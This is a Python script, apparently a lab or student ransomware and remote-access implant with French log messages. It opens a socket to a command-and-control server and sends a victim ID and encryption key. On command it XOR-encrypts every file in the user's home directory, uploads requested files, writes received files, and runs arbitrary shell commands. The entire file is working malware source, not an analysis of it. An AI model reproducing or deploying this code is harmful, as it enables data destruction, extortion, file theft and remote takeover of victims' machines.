import os, socket, subprocess, string
from datetime import datetime

def log_action(message):
    log_file = os.path.expanduser("~/.system_trace.log")
    with open(log_file, "a") as log:
        log.write(f"[{datetime.now()}] {message}\n")

def get_uuid():
    try: return open("/proc/sys/kernel/random/uuid").read().strip()
    except: return "test-uuid"

def get_key():
    return ''.join(string.ascii_uppercase[b % 26] for b in os.urandom(16))

def crypt_files(path, key, mode="ENCRYPT"):
    count = 0
    exclude = {'.vscode-server', '.ssh', '.local', '.cache', '.config', '.mozilla', '.dbus', '.gvfs'}
    log_action(f"--- DEBUT {mode} sur {path} ---")
    for root, dirs, files in os.walk(path):
        dirs[:] = [d for d in dirs if d not in exclude]
        for f in files:
            if f.endswith(".py") or f.startswith('.') or f == ".system_trace.log": continue
            p = os.path.join(root, f)
            if not os.path.isfile(p) or os.path.islink(p): continue
            try:
                with open(p, "rb") as f_in: data = f_in.read()
                res = bytes([data[i] ^ key.encode()[i % len(key)] for i in range(len(data))])
                with open(p, "wb") as f_out: f_out.write(res)
                log_action(f"FILE_{mode}: {p}")
                count += 1
            except Exception as e:
                log_action(f"ERROR_{mode}: {p} ({e})")
    log_action(f"--- FIN {mode}: {count} fichiers ---")
    return count

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(None) 
    try:
        s.connect(("127.0.0.1", 8888))
        key, uid = get_key(), get_uuid()
        s.send(f"UUID:{uid} | KEY:{key}".encode())
        log_action(f"CONNEXION ETABLIE - UUID:{uid}")

        while True:
            cmd = s.recv(1024).decode()
            if not cmd or cmd == "exit": 
                log_action("DECONNEXION ORDONNEE PAR C2")
                break

            if cmd in ["ENCRYPT", "DECRYPT"]:
                target = os.path.expanduser("~")
                nb = crypt_files(target, key, mode=cmd)
                s.send(f"Termine ({nb} fichiers). Log: ~/.system_trace.log".encode())

            elif cmd.startswith("GET "):
                p = cmd.split()[1]
                if os.path.exists(p):
                    with open(p, "rb") as f: d = f.read()
                    s.send(str(len(d)).encode())
                    if s.recv(1024).decode() == "READY": 
                        s.sendall(d)
                        log_action(f"EXFILTRATION SUCCES: {p}")
                else:
                    s.send(b"ERREUR: Introuvable")
                    log_action(f"EXFILTRATION ECHEC: {p} (Introuvable)")

            elif cmd.startswith("SEND "):
                size = int(s.recv(1024).decode())
                s.send(b"READY")
                data = b""
                while len(data) < size: data += s.recv(4096)
                name = "recu_" + os.path.basename(cmd.split()[1])
                with open(name, "wb") as f: f.write(data)
                s.send(f"Fichier {name} bien recu.".encode())
                log_action(f"RECEPTION SUCCES: {name} ({size} bytes)")
            
            else:
                try:
                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    s.send(out if out else b"OK")
                    log_action(f"SHELL CMD: {cmd}")
                except Exception as e:
                    s.send(str(e).encode())
                    log_action(f"SHELL ERROR: {cmd} ({e})")
    finally: s.close()

if __name__ == "__main__": main().
